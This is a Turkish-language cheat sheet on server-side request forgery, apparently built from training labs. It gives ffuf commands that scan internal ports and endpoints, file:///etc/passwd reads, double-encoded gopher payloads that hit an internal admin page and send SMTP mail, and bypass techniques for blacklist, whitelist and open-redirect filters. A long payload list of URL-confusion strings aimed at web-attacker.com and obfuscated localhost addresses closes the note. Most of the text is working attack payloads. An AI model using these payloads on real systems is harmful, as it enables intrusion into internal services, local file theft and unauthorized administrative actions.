---
{"dg-publish":true,"permalink":"/cheat-sheet/ssrf-ch/"}
---



### 1- SSRF Port Taraması Örneği 

```shell-session
[!bash!]$ seq 1 10000 > ports.txt
```

```bash
ffuf -w ./ports.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" -fr "Failed to connect to"
```

### 2- Local File Inclusion (LFI)

`file://` şemasıyla örneğin `file:///etc/passwd` yazarak web uygulaması üzerinden local dosya okunabilir.

![Pasted image 20250331145314.png](/img/user/resimler/Pasted%20image%2020250331145314.png)

### 3-Kısıtlanmış Endpoint'lere Erişim

![Pasted image 20250331144956.png](/img/user/resimler/Pasted%20image%2020250331144956.png)

Gördüğümüz gibi, **web server** varsayılan **Apache 404** yanıtını döndürüyor. Ayrıca, **HTTP 403** yanıtlarını da filtrelemek için, **Apache varsayılan hata sayfalarında bulunan** `Server at dateserver.htb Port 80` ifadesine göre sonuçlarımızı filtreleyeceğiz. **Web application** PHP çalıştırdığından, `.php` uzantısını belirteceğiz.

```shell-session
[!bash!]$ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" -fr "Server at dateserver.htb Port 80"

<SNIP>

[Status: 200, Size: 361, Words: 55, Lines: 16, Duration: 3872ms]
    * FUZZ: admin
[Status: 200, Size: 11, Words: 1, Lines: 1, Duration: 6ms]
    * FUZZ: availability
```

### 4- gopher Protocol

 * gopher URL'si oluşturmak için tüm özel karakterleri URL olarak encode etmemiz gerekir. 
 * Daha sonra, verileri gopher URL şeması, hedef host ve port ve bir alt çizgi ile prefix'lememiz gerekir, böylece aşağıdaki gopher URL'si elde edilir:

```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

```
gopher://dateserver.htb:80/_POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```

Not : Gopher URL, HTTP parametresi içinde gönderileceğinden **iki kez URL-encode** edilmelidir: ilki request formatı için, ikincisi parametre içinde taşınabilmesi için.
 
```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

İki kez decode edilmiş hali:

```
dateserver=gopher://dateserver.htb:80/_POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin&date=2024-01-01
```

**Gopher** protokolü, sadece HTTP değil, **SMTP (port 25)** gibi internal servislerle de etkileşime geçebilir. Doğru **gopher URL**’leri oluşturmak zordur; bu yüzden **[Gopherus](https://github.com/tarunkant/Gopherus)** aracı kullanılır.

SMTP detaylarını girerek **Gopherus** ile geçerli bir **gopher SMTP URL'si** oluşturabiliriz; bu URL, SSRF saldırısında kullanılabilir.

```shell-session
[!bash!]$ python2.7 gopherus.py --exploit smtp

Give Details to send mail: 

Mail from :  attacker@academy.htb
Mail To :  victim@academy.htb
Subject :  HelloWorld
Message :  Hello from SSRF!

Your gopher link is ready to send Mail: 

gopher://127.0.0.1:25/_MAIL%20FROM:attacker%40academy.htb%0ARCPT%20To:victim%40academy.htb%0ADATA%0AFrom:attacker%40academy.htb%0ASubject:HelloWorld%0AMessage:Hello%20from%20SSRF%21%0A.

-----------Made-by-SpyD3r-----------
```

### 5- Blind SSRF 

**Blind SSRF**, response içeriğini göremediğimiz SSRF türüdür; bu durumda, hedef sisteme yapılan isteklerin etkisi dolaylı olarak gözlemlenir. Farklı hata mesajlarına göre **açık/kapalı port taraması** veya **dosya varlık kontrolü** yapılabilir.

![Pasted image 20250331170012.png](/img/user/resimler/Pasted%20image%2020250331170012.png)

Ancak, bir port açıksa ve geçerli bir HTTP response'u veriyorsa, farklı bir hata mesajı alırız:

![Pasted image 20250331170037.png](/img/user/resimler/Pasted%20image%2020250331170037.png)

Ayrıca, daha önce olduğu gibi local dosyaları okuyamasak da, aynı tekniği dosya sistemindeki mevcut dosyaları tanımlamak için kullanabiliriz. Çünkü hata mesajı var olan ve olmayan dosyalar için farklıdır, tıpkı açık ve kapalı portlar için farklı olduğu gibi:

![Pasted image 20250331172107.png](/img/user/resimler/Pasted%20image%2020250331172107.png)

Geçersiz dosyalar için hata mesajı farklıdır:

![Pasted image 20250331172120.png](/img/user/resimler/Pasted%20image%2020250331172120.png)

### 6- Diğer back-end sistemlere karşı SSRF saldırıları

SSRF ile sunucu, saldırganın belirttiği özel IP adresine (örn. `192.168.0.68`) istek göndererek iç ağdaki servisleri erişilebilir hale getirir; IP adresi brute-force edilerek farklı sistemler de keşfedilebilir.

```
stockApi=http://192.168.0.68/admin
```

![Pasted image 20250328022817.png](/img/user/resimler/Pasted%20image%2020250328022817.png)

![Pasted image 20250328023128.png](/img/user/resimler/Pasted%20image%2020250328023128.png)

![Pasted image 20250328023140.png](/img/user/resimler/Pasted%20image%2020250328023140.png)

### 7-Blacklist-based input filters ile SSRF


- **`127.0.0.1`’in alternatif IP gösterimlerini** kullanın, örneğin **`2130706433`, `017700000001` veya `127.1`**.

- **`127.0.0.1`’e çözümlenen** kendi **domain**’inizi kaydedin. Örneğin, **`spoofed.burpcollaborator.net`** kullanılabilir.

- **Engellenen string’leri**, **URL encoding** veya **büyük/küçük harf değişimi** ile gizleyin.

- **Yönlendirme yapan bir URL sağlayarak** hedef URL’ye ulaşın. Farklı yönlendirme kodları ve protokoller deneyin. Örneğin, yönlendirme sırasında **`http`’den `https`’ye geçmek**, bazı **anti-SSRF filtrelerini** atlatabilir.


Örnek --> `127.0.0.1/admin yerine` --> Çift encode --> `127.1/%2561dmin`


### 8-Whitelist based input filters ile SSRF

Whitelist tabanlı input filtrelerini atlatmak için aşağıdaki teknikler kullanılabilir:

- Kimlik bilgilerini URL’ye gömmek:  
    `https://expected-host:fakepassword@evil-host`
    
- URL fragment’ini kullanmak:  
    `https://evil-host#expected-host`
    
- DNS naming hiyerarşisinden faydalanmak:  
    `https://expected-host.evil-host`
    
- URL encoding yapmak:  
    `https://evil%2Dhost/expected-host`
    
- Double-encoding yapmak:  
    `https://evil%252Dhost/expected-host`

Örnek : 

`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

1. **Hedef**: Saldırgan, uygulamanın URL işleme açığını kullanarak sunucudan `localhost` üzerindeki admin paneline istek gönderiyor.  
2. **URL Yapısı**: `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`, internal sisteme erişimi gizlemek için özel hazırlanmış.  
3. **Filtre Atlatma**: `@stock.weliketoshop.net`, uygulamanın domain doğrulama filtresini geçmek için ekleniyor.  
4. **%2523 Kullanımı**: Çift kodlanmış `#` (`%2523`), URL parsing'i yanıltarak `localhost`’u gizliyor.  
5. **İstek Yönlendirme**: Sunucu, `http://localhost/admin/delete?username=carlos` adresine istek gönderiyor.  
6. **Sonuç**: Yönetici paneli, `carlos` kullanıcısını silen işlemi tetikliyor.


### 9- Open redirection aracılığıyla SSRF filtrelerini atlama

SSRF'ye karşı alınan önlemlerin fazla olduğu durumlarda, open redirection aracılığıyla SSRF yapmak mümkün olabilir.

Örneğin uygulama aşağıdaki URL'nin bulunduğu bir open redirection güvenlik açığı içeriyor:

```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

URL filtresini atlamak için open redirection güvenlik açığından yararlanabilir ve SSRF güvenlik açığını aşağıdaki şekilde kullanabilirsiniz:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```










































```
https://\\web-attacker.com/
https://example.com &%40web-attacker.com# %40web-attacker.com/
https://example.com;.web-attacker.com/
https://example.com:%40web-attacker.com/
https://example.com:443:\%40%40web-attacker.com/
https://example.com:443\%40web-attacker.com/
https://example.com:443#\%40web-attacker.com/
https://example.com:anything%40web-attacker.com/
https://example.com?%40web-attacker.com/
https://example.com.%5F.web-attacker.com/
https://example.com.-.web-attacker.com/
https://example.com.%2C.web-attacker.com/
https://example.com.;.web-attacker.com/
https://example.com.%21.web-attacker.com/
https://example.com.%27.web-attacker.com/
https://example.com.".web-attacker.com/
https://example.com.%28.web-attacker.com/
https://example.com.%29.web-attacker.com/
https://example.com.{.web-attacker.com/
https://example.com.}.web-attacker.com/
https://example.com.*.web-attacker.com/
https://example.com.&.web-attacker.com/
https://example.com.`.web-attacker.com/
https://example.com.+.web-attacker.com/
https://example.com.web-attacker.com/
https://example.com.=.web-attacker.com/
https://example.com.%7E.web-attacker.com/
https://example.com.%24.web-attacker.com/
https://example.com%5B%40web-attacker.com/
https://example.com%40web-attacker.com/
https://example.com\;%40web-attacker.com/
https://example.com&anything%40web-attacker.com/
https://example.com#web-attacker.com/
https://example.com%2523web-attacker.com/
https://example.comweb-attacker.com/
https://web-attacker.com%09example.com/
https://web-attacker.com%0Aexample.com/
https://web-attacker.com%0D%0Aexample.com/
https://web-attacker.com%0Dexample.com/
https://web-attacker.com%E2%80%A8example.com/
https://web-attacker.com%E2%80%A9example.com/
https://web-attacker.com %40example.com/
https://web-attacker.com &%40example.com/
https://web-attacker.com example.com/
https://web-attacker.com;https://example.com/
https://web-attacker.com:\%40%40example.com/
0://web-attacker.com:80;http://example.com:80/
https://web-attacker.com?example.com/
https://web-attacker.com?%00example.com/
https://web-attacker.com?=.example.com/
https://web-attacker.com?=example.com/
https://web-attacker.com?http://example.com/
https://web-attacker.com?https://example.com/
https://web-attacker.com../
http://web-attacker.com.example.com/
https://web-attacker.com.example.com/
https://web-attacker.com%EF%BC%8Eexample.com/
https://web-attacker.com%40%40example.com/
https://web-attacker.com%40example.com/
https://web-attacker.com/?d=example.com/
https://web-attacker.com/.example.com/
https://web-attacker.com///example.com/
https://web-attacker.com/example.com/
https://web-attacker.com\.example.com/
https://web-attacker.com\%40%40example.com/
https://web-attacker.com\example.com/
https://web-attacker.com\anything%40example.com/
https://web-attacker.com%EF%BC%86example.com/
https://web-attacker.com%EF%B9%A0example.com/
https://web-attacker.com#%40example.com/
https://web-attacker.com#\%40example.com/
https://web-attacker.com#example.com/
https://web-attacker.com#%00example.com/
https://web-attacker.com%250d%250a%40example.com/
https://web-attacker.com%2523%40example.com/
https://web-attacker.com%252e%40example.com/
https://web-attacker.com%252f%40example.com/
https://web-attacker.com%253a443.example.com/
https://web-attacker.com%25ffexample.com/
https://web-attacker.com+%40example.com/
https://web-attacker.com+&%40example.com/
https://web-attacker.com%00example.com/
http://anythingexample.com/
https://anythingexample.com/
https://foo%40web-attacker.com %40example.com/
https://foo%40web-attacker.com:443%40example.com/
http://localhost.web-attacker.com/
https://localhost.web-attacker.com/
http://sexample.com/
https://%09web-attacker.com/
https://%0Aweb-attacker.com/
%0D%0A//web-attacker.com
%0D%0A\\web-attacker.com
%40web-attacker.com
http:%40web-attacker.com
https:%40web-attacker.com
///web-attacker.com
//web-attacker.com
/\web-attacker.com
/&bsol;/web-attacker.com
/&NewLine;/web-attacker.com
/&sol;/web-attacker.com
/&Tab;/web-attacker.com
\%09\web-attacker.com
\%0A\web-attacker.com
\/\/web-attacker.com
\/web-attacker.com
http:\\web-attacker.com\
#web-attacker.com
http:web-attacker.com
https:web-attacker.com
%00http://web-attacker.com
%01http://web-attacker.com
%02http://web-attacker.com
%03http://web-attacker.com
%04http://web-attacker.com
%05http://web-attacker.com
%06http://web-attacker.com
%07http://web-attacker.com
%08http://web-attacker.com
%09http://web-attacker.com
%0Ahttp://web-attacker.com
%0Bhttp://web-attacker.com
%0Chttp://web-attacker.com
%0Dhttp://web-attacker.com
%0Ehttp://web-attacker.com
%0Fhttp://web-attacker.com
%10http://web-attacker.com
%11http://web-attacker.com
%12http://web-attacker.com
%13http://web-attacker.com
%14http://web-attacker.com
%15http://web-attacker.com
%16http://web-attacker.com
%17http://web-attacker.com
%18http://web-attacker.com
%19http://web-attacker.com
%1Ahttp://web-attacker.com
%1Bhttp://web-attacker.com
%1Chttp://web-attacker.com
%1Dhttp://web-attacker.com
%1Ehttp://web-attacker.com
%1Fhttp://web-attacker.com
 http://web-attacker.com
h%09ttp://web-attacker.com
h%0Attp://web-attacker.com
h%0Dttp://web-attacker.com
http%09://web-attacker.com
http%0A://web-attacker.com
http%0D://web-attacker.com
%09http%09://web-attacker.com
%0Ahttp%0A://web-attacker.com
%0Dhttp%0D://web-attacker.com
http:/\web-attacker.com
http:/\\web-attacker.com
http:\\web-attacker.com
http:\web-attacker.com
http:/web-attacker.com
http:/0/web-attacker.com
https://%E2%80%8Bweb-attacker.com/
https://%E2%81%A0web-attacker.com/
https://%C2%ADweb-attacker.com/
https://%5B::%5D/
https://%5B::1%5D/
https://%5B::ffff:0.0.0.0%5D/
https://%5B::ffff:0000:0000%5D/
https://%5B::ffff:7f00:1%5D/
https://%5B::%EF%AC%80%EF%AC%80:7f00:1%5D/
https://%5B0:0:0:0:0:ffff:127.0.0.1%5D/
https://%5B0:0:0:0:0:ffff:1%E3%89%97.0.0.1%5D/
https://%5B0:0:0:0:0:ffff:%E2%91%AB7.0.0.1%5D/
https://%5B0:0:0:0:0:%EF%AC%80%EF%AC%80:127.0.0.1%5D/
https://%5B0000::1%5D/
https://%5B0000:0000:0000:0000:0000:0000:0000:0000%5D/
https://%5B0000:0000:0000:0000:0000:0000:0000:0001%5D/
https://%400/
https://\l\o\c\a\l\h\o\s\t/
https://example.com.local/
https://example.com.localhost/
https://0/
0:80
https://0.0.0.0/
https://0000.0000.0000.0000/
https://00000177.00000000.00000000.00000001/
https://0177.0000.0000.0001/
https://017700000001/
https://0%E2%91%B0700000001/
https://0x00000000/
https://0x100000000/
https://0x17f000001/
https://0x17f000002/
https://0x7F.0.0000.00000001/
https://0x7F.0.0000.0001/
https://0x7f.0x00.0x00.0x01/
https://0x7f.0x00.0x00.0x02/
https://0x7F.1/
https://0x7f000001/
https://0x7f000002/
https://127.0.0.1/
https://1%E3%89%97.0.0.1/
https://%E2%91%AB7.0.0.1/
https://127.0.0.2/
https://1%E3%89%97.0.0.2/
https://%E2%91%AB7.0.0.2/
https://127.000000000000000.1/
https://127.1/
https://2130706433/
https://21307064%E3%89%9D/
https://2130706%E3%8A%B83/
https://21%E3%89%9A706433/
https://2%E2%91%AC0706433/
https://%E3%89%9130706433/
https://%E3%89%91%E3%89%9A%E2%91%A6%E2%93%AA%E2%91%A5%E2%91%A3%E3%89%9D/
https://45080379393/
https://localhost/
https://%C2%ADlocalhost/
https://%CD%8Flocalhost/
https://%E1%A0%8Blocalhost/
https://%E1%A0%8Clocalhost/
https://%E1%A0%8Dlocalhost/
https://%E1%A0%8Elocalhost/
https://%E1%A0%8Flocalhost/
https://%E2%80%8Blocalhost/
https://%E2%81%A0localhost/
https://%E2%81%A4localhost/
https://localho%EF%AC%86/
https://lo%E3%8E%88host/
https://localho%EF%AC%85/
```